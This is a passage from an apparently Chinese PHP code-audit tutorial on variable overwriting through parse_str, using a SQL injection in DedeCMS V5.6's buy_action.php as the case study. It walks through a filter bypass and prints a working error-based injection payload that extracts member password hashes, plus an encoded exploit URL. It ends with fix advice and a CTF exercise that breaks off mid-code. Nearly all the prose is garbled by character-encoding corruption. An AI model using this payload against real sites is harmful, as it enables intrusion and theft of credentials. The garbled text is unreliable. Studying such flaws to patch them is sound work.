title="Bell"></a>Bell</h2><p>é¢˜ç›®å«åšé’Ÿï¼Œä»£ç å¦‚ä¸‹ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-40.png"></p><p><strong>æ¼æ´è§£æ</strong> ï¼š</p><p>è¿™ä¸€å…³å…¶å®æ˜¯è€ƒå¯Ÿå˜é‡è¦†ç›–æ¼æ´ï¼Œâ½½å¯¼è‡´è¿™â¼€æ¼æ´çš„å‘â½£åˆ™æ˜¯ä¸å®‰å…¨çš„ä½¿â½¤ <strong>parse_str</strong> å‡½æ•°ã€‚ ç”±äº <strong>ç¬¬21è¡Œ</strong> ä¸­çš„ <strong>parse_str()</strong> è°ƒç”¨ï¼Œå…¶è¡Œä¸ºéå¸¸ç±»ä¼¼äºæ³¨å†Œå…¨å±€å˜é‡ã€‚æˆ‘ä»¬é€šè¿‡æäº¤ç±»ä¼¼ <strong>config[dbhost]&#x3D;127.0.0.1</strong> è¿™æ ·ç±»å‹çš„æ•°æ®ï¼Œè¿™æ ·å› æ­¤æˆ‘ä»¬å¯ä»¥æ§åˆ¶ <strong>getUser()</strong> ä¸­ç¬¬5åˆ°8è¡Œçš„å…¨å±€å˜é‡ <strong>$config</strong> ã€‚å¦‚æœç›®æ ‡å­˜åœ¨ç™»é™†éªŒè¯çš„è¿‡ç¨‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å˜é‡è¦†ç›–çš„æ–¹æ³•ï¼Œè¿œç¨‹è¿æ¥æˆ‘ä»¬è‡ªå·±çš„mysqlæœåŠ¡å™¨ï¼Œä»è€Œç»•è¿‡è¿™å—çš„ç™»é™†éªŒè¯ï¼Œè¿›è€Œè¿›è¡Œæ”»å‡»ã€‚æˆ‘ä»¬æ¥çœ‹çœ‹PHPå®˜æ–¹å¯¹ <strong>parse_str</strong> å‡½æ•°çš„å®šä¹‰ï¼š</p><blockquote><p><a href="http://php.net/manual/zh/function.parse-str.php"> <strong>parse_str</strong> </a></p><p><strong>åŠŸèƒ½</strong> ï¼šparse_strçš„ä½œç”¨å°±æ˜¯è§£æå­—ç¬¦ä¸²å¹¶ä¸”æ³¨å†Œæˆå˜é‡ï¼Œå®ƒåœ¨æ³¨å†Œå˜é‡ä¹‹å‰ä¸ä¼šéªŒè¯å½“å‰å˜é‡æ˜¯å¦å­˜åœ¨ï¼Œæ‰€ä»¥ä¼šç›´æ¥è¦†ç›–æ‰å½“å‰ä½œç”¨åŸŸä¸­åŸæœ‰çš„å˜é‡ã€‚</p><p><strong>å®šä¹‰</strong> ï¼š<code>void parse_str( string $encoded_string [, array &amp;$result ] )</code></p><p>å¦‚æœ <strong>encoded_string</strong> æ˜¯ URL ä¼ å…¥çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆquery stringï¼‰ï¼Œåˆ™å°†å®ƒè§£æä¸ºå˜é‡å¹¶è®¾ç½®åˆ°å½“å‰ä½œç”¨åŸŸï¼ˆå¦‚æœæä¾›äº† result åˆ™ä¼šè®¾ç½®åˆ°è¯¥æ•°ç»„é‡Œ ï¼‰ã€‚</p></blockquote><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-41.png"></p><h3 id="å®ä¾‹åˆ†æ-2"><a href="#å®ä¾‹åˆ†æ-2" class="headerlink" title="å®ä¾‹åˆ†æ"></a>å®ä¾‹åˆ†æ</h3><p>æœ¬æ¬¡å®ä¾‹åˆ†æï¼Œæˆ‘ä»¬é€‰å–çš„æ˜¯ <strong>DedeCmsV5.6</strong> ç‰ˆæœ¬ã€‚è¯¥ç‰ˆæœ¬çš„<strong>buy_action.php</strong>å¤„å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œè¿™é‡Œå…¶å®å’Œ <strong>parse_str</strong> æœ‰å¾ˆå¤§å…³ç³»ï¼Œä¸‹â¾¯æˆ‘ä»¬æ¥çœ‹çœ‹å…·ä½“çš„æ¼æ´ä½ç½®ã€‚</p><p>å®˜ç½‘äº20140225å‘å¸ƒäº†<strong>V5.7.36</strong> æ­£å¼ç‰ˆ0225å¸¸è§„æ›´æ–°è¡¥ä¸ï¼Œè¿™é‡Œé¢çš„æ”¹åŠ¨ä¸€å…±å››ä¸ªæ–‡ä»¶ <strong>dede&#x2F;sys_info.php</strong> ã€ <strong>dede&#x2F;templets&#x2F;sys_info.htm</strong> ã€<strong>include&#x2F;uploadsafe.inc.php</strong> ã€<strong>member&#x2F;buy_action.php</strong> ã€‚è¿™é‡Œæˆ‘ä»¬å…³æ³¨ä¸€ä¸‹ <strong>member&#x2F;buy_action.php</strong> è¿™ä¸ªæ–‡ä»¶çš„æ”¹åŠ¨æƒ…å†µã€‚</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-42.png"></p><p>diffä¸€ä¸‹è¡¥ä¸å’Œæºæ–‡ä»¶ï¼šï¼ˆè¿™é‡Œé‡‡ç”¨sublimeçš„FileDiffsæ’ä»¶æ¥è¿›è¡Œdiffå¯¹æ¯”ï¼‰</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-43.png"></p><p>æ”¹åŠ¨éƒ¨åˆ†ï¼Œä¸»è¦é’ˆå¯¹åŠ å¯†å‡½æ•°çš„å¼ºåº¦è¿›è¡Œäº†åŠ å¼ºï¼Œæ‰€ä»¥åšä¸€ä¸ªæ¨æ–­è¿™ä¸ªæ¼æ´åº”è¯¥æ˜¯ç”±äº <strong>mchStrCode</strong> è¿™ä¸ªç¼–ç æ–¹æ³•é€ æˆçš„ã€‚åœ¨è¯»è¿™ä¸ªå‡½æ•°æ—¶å‘ç°ï¼Œå¦‚æœåœ¨æˆ‘ä»¬çŸ¥é“ <strong>cfg_cookie_encode</strong> çš„æƒ…å†µä¸‹ï¼Œè¢«ç¼–ç å­—ç¬¦ä¸²æ˜¯å¯ä»¥è¢«é€†æ¨å‡ºæ¥çš„ã€‚</p><p>è¿™ä¸ªæ¼æ´åœ¨ä¹Œäº‘ä¸Šçˆ†å‡ºæ¥çš„æ—¶å€™ï¼Œæ˜¯sqlæ³¨å…¥ï¼Œæ‰€ä»¥æˆ‘æ¨æ–­å¯èƒ½åœ¨è°ƒç”¨è¿™ä¸ªç¼–ç å‡½æ•°è¿›è¡Œè§£ç çš„åœ°æ–¹ï¼Œè§£ç ä¹‹åå¯èƒ½æ²¡æœ‰ä»»ä½•è¿‡æ»¤å’Œç»•è¿‡ï¼Œåˆæˆ–è€…å¯ä»¥å¯ç»•è¿‡è¿‡æ»¤ï¼Œå¯¼è‡´sqlè¯­å¥æ‹¼æ¥å†™å…¥åˆ°äº†æ•°æ®åº“ï¼Œè€Œä¸”è¿™é‡Œè§£ç çš„å‡½æ•°å¯ä»¥è¢«æ”»å‡»è€…æ§åˆ¶ï¼Œä»è€Œå¯¼è‡´äº†SQLæ³¨å…¥çš„äº§ç”Ÿã€‚</p><h3 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h3><p>æˆ‘ä»¬å…¨å±€æœç´¢ä¸€ä¸‹å“ªäº›åœ°æ–¹è°ƒç”¨äº†è¿™ä¸ª <strong>mchStrCode</strong> å‡½æ•°ï¼Œå‘ç°æœ‰ä¸‰å¤„ï¼ˆå¯ä»¥ç”¨sublime <code>Ctrl+Shitf+F</code> è¿›è¡Œæœç´¢ï¼‰ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-44.png"></p><p><strong>ç¬¬17è¡Œ</strong> (ä¸Šå›¾)çš„ <strong>parse_str</strong> å¼•èµ·äº†æˆ‘çš„å…´è¶£ï¼Œçœ‹ä¸€ä¸‹è¿™ä¸€å°æ®µä»£ç åšäº†äº›ä»€ä¹ˆï¼ˆä¸‹å›¾ç¬¬4è¡Œå¤„ï¼‰ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-45.png"></p><p>æˆ‘ä»¬é‡ç‚¹æ¥çœ‹ifè¯­å¥å¼€å§‹æ—¶çš„ä¸‰è¡Œä»£ç ï¼Œ <strong>mchStrCode</strong> æ˜¯æˆ‘ä»¬åœ¨ä¸Šä¸€å°èŠ‚é€šè¿‡å¯¹æ¯”è¡¥ä¸å‘ç°å˜åŒ–çš„å‡½æ•°ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥ç¼–ç æˆ–è€…è§£ç ç”¨æˆ·æäº¤çš„æ•°æ®ï¼Œè€Œä¸” <strong>$pd_encode</strong> ä¹Ÿæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å˜é‡ã€‚</p><p><strong>parse_str</strong> æ–¹æ³•å°†è§£ç å <strong>$pd_encode</strong> ä¸­çš„å˜é‡æ”¾åˆ° <strong>$mch_Post</strong> æ•°ç»„ä¸­ï¼Œä¹‹åçš„ <strong>foreach</strong> è¯­å¥å­˜åœ¨æ˜æ˜¾çš„å˜é‡è¦†ç›–ï¼Œå°† <strong>$mch_Post</strong> ä¸­çš„keyå®šä¹‰ä¸ºå˜é‡ï¼ŒåŒæ—¶å°†keyæ‰€å¯¹åº”çš„valueèµ‹äºˆè¯¥å˜é‡ã€‚ç„¶åï¼Œå†å‘ä¸‹å°±æ˜¯æ‰§è¡ŒSQLæŸ¥è¯¢äº†ã€‚</p><p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å­˜åœ¨ä¸€ä¸ªæ˜æ˜¾çš„ç–å¿½æ˜¯ï¼Œæ²¡æœ‰å¯¹å®šä¹‰çš„ <strong>key</strong> è¿›è¡Œæ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ <strong>mschStrCode</strong> å¯¹æ”»å‡»ä»£ç è¿›è¡Œç¼–ç ï¼Œä»è€Œç»•è¿‡GPCå’Œå…¶ä»–è¿‡æ»¤æœºåˆ¶ï¼Œä½¿æ”»å‡»ä»£ç ç›´è¾¾ç›®æ ‡ã€‚æˆ‘ä»¬å†æ¥çœ‹çœ‹ <strong>mchStrCode</strong> å‡½æ•°çš„ä»£ç ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-46.png"></p><p>ä¸Šå›¾æˆ‘ä»¬è¦æ³¨æ„ç¬¬ä¸‰è¡Œ <strong>$key</strong> å€¼çš„è·å–æ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_USER_AGENT&quot;</span>].<span class="variable">$GLOBALS</span>[<span class="string">&#x27;cfg_cookie_encode&#x27;</span>]),<span class="number">8</span>,<span class="number">18</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°† <strong>$_SERVER[â€œHTTP_USER_AGENTâ€]</strong> å’Œ <strong>$GLOBALS[â€˜cfg_cookie_encodeâ€™]</strong> è¿›è¡Œæ‹¼æ¥ï¼Œç„¶åè¿›è¡Œmd5è®¡ç®—ä¹‹åå–å‰ <strong>18</strong> ä½å­—ç¬¦ï¼Œå…¶ä¸­çš„ <strong>$_SERVER[â€œHTTP_USER_AGENTâ€]</strong> æ˜¯æµè§ˆå™¨çš„æ ‡è¯†ï¼Œå¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œå…³é”®æ˜¯è¿™ä¸ª <strong>$GLOBALS[â€˜cfg_cookie_encodeâ€™]</strong> æ˜¯æ€ä¹ˆæ¥çš„ã€‚é€šè¿‡é’ˆå¯¹è¡¥ä¸æ–‡ä»¶çš„å¯¹æ¯”ï¼Œå‘ç°äº† <strong>&#x2F;install&#x2F;index.php</strong> çš„ <strong>$rnd_cookieEncode</strong> å­—ç¬¦ä¸²çš„ç”ŸæˆåŒæ ·æ˜¯åŠ å¼ºäº†å¼ºåº¦ï¼Œ <strong>$rnd_cookieEncode</strong> å­—ç¬¦ä¸²æœ€ç»ˆä¹Ÿå°±æ˜¯å‰é¢æåˆ°çš„ <strong>$GLOBALS[â€˜cfg_cookie_encodeâ€™]</strong> </p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-47.png"></p><p>çœ‹çœ‹æºä»£ç é‡Œæ˜¯æ€ä¹ˆå¤„ç†è¿™ä¸ªçš„ <strong>$rnd_cookieEncode</strong> å˜é‡çš„ã€‚</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-48.png"></p><p>è¿™æ®µä»£ç ç”Ÿæˆçš„åŠ å¯†å¯†åŒ™å¾ˆæœ‰è§„å¾‹ï¼Œæ‰€æœ‰å¯†åŒ™æ•°ä¸º26^6*(9999-1000)&#x3D;2779933068224,æŠŠæ‰€æœ‰å¯èƒ½çš„ç»„åˆç”Ÿæˆå­—å…¸ï¼Œç”¨passwordproæš´åŠ›è·‘MD5æˆ–è€…ä½¿ç”¨GPUæ¥ç ´è§£ï¼Œç ´è§£å‡ºmd5è¿‡çš„å¯†åŒ™ä¹ŸèŠ±ä¸äº†å¤šå°‘æ—¶é—´ã€‚ å½“ç„¶è¿™ä¸ªæ˜¯å®Œå…¨æœ‰å¯èƒ½çš„ï¼Œä½†æ˜¯å¾ˆè€—æ—¶é—´ï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥çœ‹çœ‹æœ‰æ²¡æœ‰åŠæ³•èƒ½å¤Ÿç»•è¿‡è¿™ä¸ªçŒœæµ‹çš„è¿‡ç¨‹ï¼Œè®©é¡µé¢ç›´æ¥å›æ˜¾å›æ¥ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>è™½ç„¶æ•´ä¸ªæ¼æ´åˆ©ç”¨åŸç†å¾ˆç®€å•ï¼Œä½†æ˜¯åˆ©ç”¨éš¾åº¦è¿˜æ˜¯å¾ˆé«˜çš„ï¼Œå…³é”®ç‚¹è¿˜æ˜¯å¦‚ä½•è§£å†³è¿™ä¸ª <strong>mchStrCode</strong> ï¼Œ <strong>mchStrCode</strong> è¿™ä¸ªå‡½æ•°çš„ç¼–ç è¿‡ç¨‹ä¸­éœ€è¦çŸ¥é“ç½‘ç«™é¢„è®¾çš„ <strong>cfg_cookie_encode</strong> ï¼Œè€Œè¿™ä¸ªå†…å®¹åœ¨ç”¨æˆ·ç•Œé¢åªå¯ä»¥è·å–å®ƒçš„MD5å€¼ã€‚è™½ç„¶<strong>cfg_cookie_encode</strong>çš„ç”Ÿæˆæœ‰ä¸€å®šçš„è§„å¾‹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨MD5ç¢°æ’çš„æ–¹æ³•è·å¾—ï¼Œä½†æ˜¯æ—¶é—´æˆæœ¬å¤ªé«˜ï¼Œæ„Ÿè§‰ä¸å¤ªå€¼å¾—ã€‚æ‰€ä»¥æƒ³æ³•æ˜¯åœ¨ä»€ä¹ˆåœ°æ–¹å¯ä»¥ä½¿ç”¨ <strong>mchStrCode</strong> åŠ å¯†å¯æ§å‚æ•°ï¼Œå¹¶ä¸”èƒ½å¤Ÿè¿”å›åˆ°é¡µé¢ä¸­ã€‚æ‰€ä»¥æœç´¢ä¸€ä¸‹å…¨æ–‡å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ªå‡½æ•°ã€‚</p><p>äºæ˜¯ï¼Œæˆ‘ä»¬åœ¨ <strong>member&#x2F;buy_action.php</strong> çš„104è¡Œæ‰¾åˆ°äº†ä¸€å¤„åŠ å¯†è°ƒç”¨ï¼š**$pr_encode &#x3D; str_replace(â€˜&#x3D;â€™, â€˜â€™, mchStrCode($pr_encode));** æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªåˆ†æ”¯çš„æ•´ä¸ªä»£ç ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-49.png"></p><p>è¿™é‡Œçš„ <strong>ç¬¬38è¡Œ</strong> æœ‰ä¸€ <code>$tpl-&gt;LoadTemplate(DEDEMEMBER.&#39;/templets/buy_action_payment.htm&#39;);</code> åœ¨ <strong>&#x2F;templets&#x2F;buy_action_payment.htm</strong> ä¸­ï¼Œæˆ‘æ‰¾åˆ°äº†é¡µé¢ä¸Šå›æ˜¾ä¹‹å‰åŠ å¯†çš„ <strong>$pr_encode</strong> å’Œ <strong>$pr_verify</strong> ã€‚</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-50.png"></p><p>é€šè¿‡è¿™éƒ¨åˆ†ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <strong>[cfg_dbprefix&#x3D;SQLæ³¨å…¥]</strong> çš„æäº¤è¯·æ±‚ï¼Œè¿›å…¥è¿™ä¸ªåˆ†æ”¯ï¼Œè®©å®ƒå¸®åŠ©æˆ‘æ¥ç¼–ç  <strong>[cfg_dbprefix&#x3D;SQLæ³¨å…¥]</strong> ï¼Œä»è€Œè·å–ç›¸åº”çš„ <strong>pr_encode</strong> å’Œ <strong>pr_verify</strong> ã€‚ ä½†æ˜¯ <strong>common.inc.php</strong> æ–‡ä»¶å¯¹ç”¨æˆ·æäº¤çš„å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ï¼Œå‡¡æäº¤çš„å€¼ä»¥cfgã€GLOBALSã€GETã€POSTã€COOKIE å¼€å¤´éƒ½ä¼šè¢«æ‹¦æˆªï¼Œå¦‚ä¸‹å›¾ç¬¬11è¡Œã€‚</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-51.png"></p><p>è¿™ä¸ªé—®é¢˜çš„è§£å†³å°±åˆ©ç”¨åˆ°äº† <strong>$REQUEST</strong> å†…å®¹ä¸ <strong>parse_str</strong> å‡½æ•°å†…å®¹çš„å·®å¼‚ç‰¹æ€§ã€‚æˆ‘ä»¬urlä¼ å…¥çš„æ—¶å€™é€šè¿‡**[a&#x3D;1&amp;b&#x3D;2%26c&#x3D;3]<strong>è¿™æ ·çš„æäº¤æ—¶ï¼Œ <strong>$REQUEST</strong> è§£æçš„å†…å®¹å°±æ˜¯ <strong>[a&#x3D;1ï¼Œb&#x3D;2%26c&#x3D;3]</strong> ã€‚è€Œé€šè¿‡ä¸Šé¢ä»£ç çš„éå†è¿›å…¥ <strong>parse_str</strong> å‡½æ•°çš„å†…å®¹åˆ™æ˜¯ <strong>[a&#x3D;1&amp;b&#x3D;2&amp;c&#x3D;3]</strong> ï¼Œå› ä¸º <strong>parse_str</strong> å‡½æ•°ä¼šé’ˆå¯¹ä¼ å…¥è¿›æ¥çš„æ•°æ®è¿›è¡Œè§£ç ï¼Œæ‰€ä»¥è§£æåçš„å†…å®¹å°±å˜æˆäº†</strong>[a&#x3D;1ï¼Œb&#x3D;2ï¼Œc&#x3D;3]**ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ç§æ–¹æ³•ç»•è¿‡ <strong>common.inc.php</strong> æ–‡ä»¶å¯¹äºå‚æ•°å†…å®¹ä¼ é€’çš„éªŒè¯ã€‚</p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>è®¿é—® <strong>buy_action.php</strong> æ–‡ä»¶ï¼Œä½¿ç”¨å¦‚ä¸‹å‚æ•°ï¼š</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">product</span>=<span class="selector-tag">card</span><span class="selector-tag">&amp;</span><span class="selector-tag">pid</span>=<span class="number">1</span><span class="selector-tag">&amp;</span><span class="selector-tag">a</span>=<span class="number">1%</span><span class="number">26</span><span class="selector-tag">cfg_dbprefix</span>=<span class="selector-tag">dede_member_operation</span> <span class="selector-tag">WHERE</span> <span class="number">1</span>=@&#x27;/!<span class="number">12345</span><span class="selector-tag">union</span>/ <span class="selector-tag">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> <span class="selector-tag">FROM</span> (SELECT <span class="built_in">COUNT</span>(),<span class="built_in">CONCAT</span>( (SELECT pwd FROM dede_member LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">FLOOR</span>(<span class="built_in">RAND</span>(<span class="number">0</span>)<span class="number">2</span>))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)<span class="selector-tag">a</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <strong>product</strong> å’Œ <strong>pid</strong> å‚æ•°æ˜¯ä¸ºäº†è®©æˆ‘ä»¬è¿›å…¥ <strong>mchStrCode</strong> å¯¹ä¼ å…¥æ•°æ®è¿›è¡Œç¼–ç çš„åˆ†æ”¯ï¼Œå‚æ•° <strong>a</strong> æ˜¯ä¸ºäº†é…åˆä¸Šé¢æåˆ°çš„å·®å¼‚æ€§è€Œéšæ„æ·»åŠ çš„å‚æ•°ã€‚ä» <strong>cfg_dbprefix</strong> å¼€å§‹ï¼Œä¾¿æ˜¯çœŸæ­£çš„SQLæ³¨å…¥æ”»å‡»ä»£ç ã€‚ è®¿é—®è¯¥URLåï¼Œåœ¨é¡µé¢æºç ä¸­æ‰¾åˆ° <strong>pd_encode</strong> å’Œ <strong>pd_verify</strong> å­—æ®µçš„å€¼ï¼Œç”±äºç”¨æˆ· <strong>Cookie</strong> å’Œ <strong>User-Agent</strong> ä¸åŒï¼Œæ‰€è·å–çš„å€¼ä¹Ÿä¸åŒï¼Œç„¶ååœ¨é¡µé¢ä¸Šæ‰¾åˆ°äº† <strong>pd_encode</strong> å’Œ <strong>pd_verify</strong>çš„å€¼ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-52.png"></p><p>æœ€åå†æ„é€ ä¸€ä¸‹payloadå°±å¥½äº†ï¼š</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1//dedecms5.6/member/buy_action.php?pd_encode=QEpWVhZbEV9SUkBUEEBfAF8CFlkEA0VbAwVuV1BARFVQDRoOVF1dVzxVAA9TVkBvWUBTFgNHWVdXEjRwIDB0EwMNdhcZRVMBAwwMRw1RCgweE0FVWlVVEEICHAoVAU8MSVcdBR4HGggaXU4CABh/YCx1RUpidn51dWQWJy1mfmwRG097KixycmYYFhhlIS52c2wZQhRcRSRjfH8QUlVSAT1eVVVbVxEYKSt8emYQBhwHTU51fHd2YEtqJCx1GwIZBBkfHEJ1Ynd0Eip2Iy1jfnNkf394OzFweH10c017LSNjcnFkc2JpNydnYxh+YCxtNUJzahJIH1EWR0RmfWddWxBMDAxSR1tUCwEAUFEEBV4JVFEBUVYIHgIHAQRQXAQHCAsLAAIBSFYJBgUGUB0HVwEFCAgUA1UMVlUEVQJWBFIBUAQVc3ZjaCd5MSMAAwIABgYBU1IHDQkBB1IIVVMBBQcdBwUEXVsABwsKAU5QERZBFgFxEwJwQVB1AQELHFIOXUwDBwoeBwIPQVB1TAkMAFoBVlUCAAEWVFRFDANBVWdfWxFLEQtcVg8BAwMGVFMEBg8PBVUAQzJ5Y2F1ZWN/IF9XA1tdBFVeVAcIAlRVDlJVAFtRVV5YC1INAVsHBgpUBBZyAQZWZUtcQCp8WFAXd1dUU2VFARB6dGdmUQh1AVcMAABVAVJSVVcKAABdAlAAA0R1VlZVel9RDQxnWVVcD1INVlICAAICBwQQIAdXVXRWVQpWMQtcVm1vVVt7AFcOAl4IAlANBFUGVlMFBFIHUA&amp;pd_verify=fbe183b4c5a69ac7fb394a4b5cd5cfcb</span><br></pre></td></tr></table></figure><p>å†æ¬¡æé†’ï¼Œå› ä¸ºæ¯ä¸ªäººçš„ <strong>cookie</strong> å’Œ <strong>User-Agent</strong> éƒ½ä¸ä¸€æ ·ï¼Œæ‰€ä»¥ç”Ÿæˆçš„ä¹Ÿä¸ä¸€æ ·ï¼Œå»ºè®®å¤§å®¶è‡ªå·±ç”Ÿæˆä¸€ä¸‹ã€‚</p><h3 id="ä¿®å¤å»ºè®®-2"><a href="#ä¿®å¤å»ºè®®-2" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h3><p>ä¸ºäº†è§£å†³å˜é‡è¦†ç›–é—®é¢˜ï¼Œå¯ä»¥åœ¨æ³¨å†Œå˜é‡å‰å…ˆåˆ¤æ–­å˜é‡æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä½¿ç”¨ <strong>extract</strong> å‡½æ•°å¯ä»¥é…ç½®ç¬¬äºŒä¸ªå‚æ•°æ˜¯ <strong>EXTR_SKIP</strong> ã€‚ä½¿ç”¨ <strong>parse_str</strong> å‡½æ•°ä¹‹å‰å…ˆè‡ªè¡Œé€šè¿‡ä»£ç åˆ¤æ–­å˜é‡æ˜¯å¦å­˜åœ¨ã€‚</p><p>è¿™é‡Œæä¾›ä¸€ä¸ªdemoæ¼æ´æ ·ä¾‹ä»£ç ï¼Œä»¥åŠdemoçš„ä¿®å¤æ–¹æ³•ã€‚</p><p><strong>demoæ¼æ´</strong></p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-53.png"></p><p><strong>demoæ¼æ´ä¿®å¤</strong></p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-54.png"></p><h3 id="é¢˜ç›®-2"><a href="#é¢˜ç›®-2" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>çœ‹å®Œäº†ä¸Šè¿°åˆ†æï¼Œä¸çŸ¥é“å¤§å®¶æ˜¯å¦å¯¹ <strong>parse_str()</strong> å‡½æ•°æœ‰äº†æ›´åŠ æ·±å…¥çš„ç†è§£ï¼Œæ–‡ä¸­ç”¨åˆ°çš„CMSå¯ä»¥ä» <a href="http://www.dedecms.com/upimg/soft/2010/DedeCmsV5.6-UTF8-Final.tar.gz">è¿™é‡Œ</a> ä¸‹è½½ï¼Œå½“ç„¶æ–‡ä¸­è‹¥æœ‰ä¸å½“ä¹‹å¤„ï¼Œè¿˜æœ›å„ä½æ–§æ­£ã€‚å¦‚æœä½ å¯¹æˆ‘ä»¬çš„é¡¹ç›®æ„Ÿå…´è¶£ï¼Œæ¬¢è¿å‘é€é‚®ä»¶åˆ° <strong><a href="mailto:&#104;&#x6f;&#110;&#x67;&#x72;&#105;&#115;&#x65;&#x63;&#64;&#103;&#x6d;&#x61;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;">&#104;&#x6f;&#110;&#x67;&#x72;&#105;&#115;&#x65;&#x63;&#64;&#103;&#x6d;&#x61;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;</a></strong> è”ç³»æˆ‘ä»¬ã€‚<strong>Day7</strong> çš„åˆ†ææ–‡ç« å°±åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬æœ€åç•™äº†ä¸€é“CTFé¢˜ç›®ç»™å¤§å®¶ç»ƒæ‰‹ï¼Œé¢˜ç›®å¦‚ä¸‹ï¼š</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = â€œhongriâ€;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>[<span class="number">0</span>] != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>[<span class="number">0</span>]) == <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;uploadsomething.php&quot;&gt;flag is here&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span 